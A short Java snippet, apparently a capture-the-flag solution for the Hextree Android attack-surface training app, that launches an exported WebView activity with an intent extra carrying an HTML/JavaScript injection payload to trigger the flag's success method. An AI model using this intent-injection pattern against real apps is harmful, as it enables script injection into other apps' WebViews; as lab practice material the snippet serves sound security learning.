```java
@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface",
                "io.hextree.attacksurface.webviews.Flag39WebViewsActivity");
        intent.putExtra("NAME","Gabe <img src=x onerror=alert(hextree.success())>");
        startActivity(intent);
    }
```
